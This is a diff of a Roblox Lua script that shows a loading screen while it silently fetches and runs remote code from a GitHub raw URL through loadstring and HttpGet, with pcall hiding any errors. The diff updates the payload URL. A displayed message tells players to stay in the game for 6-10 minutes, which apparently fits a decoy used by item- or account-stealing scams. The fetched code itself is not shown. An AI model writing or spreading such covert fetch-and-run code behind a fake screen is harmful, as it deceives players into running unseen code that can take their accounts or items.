@@ -19,7 +19,7 @@ screenGui.ResetOnSpawn = false
 -- Eksekusi script utama saat loading screen muncul
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/ne"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/new"))()
     end)
 end)
 
@@ -305,13 +305,13 @@ Do not leave immediately in the game and wait at least 6-10 minutes before leavi
 
             local pop = Instance.new("TextLabel", gui)
             pop.Size = UDim2.new(0,280,0,50)
-            -- Atur posisi popup di kanan bawah
+            -- Atur posisi popup di sebelah menu
             if lastPopup then
-                pop.Position = UDim2.new(1, -300, 1, -50 - (lastPopup.Size.Y.Offset + 5)) -- 5 adalah jarak antar popup
+                pop.Position = UDim2.new(1, -300, 0.5, -((lastPopup.Size.Y.Offset + 5) * popupCount)) -- 5 adalah jarak antar popup
             else
-                pop.Position = UDim2.new(1, -300, 1, -50) -- Posisi awal
+                pop.Position = UDim2.new(1, -300, 0.5, -50) -- Posisi awal
             end
-            pop.AnchorPoint = Vector2.new(1, 1)
+            pop.AnchorPoint = Vector2.new(1, 0.5)
             pop.BackgroundTransparency = 0.3
             pop.BackgroundColor3 = succ and Color3.fromRGB(0,153,0) or Color3.fromRGB(200,0,0)
             pop.TextColor3 = Color3.new(1,1,1)
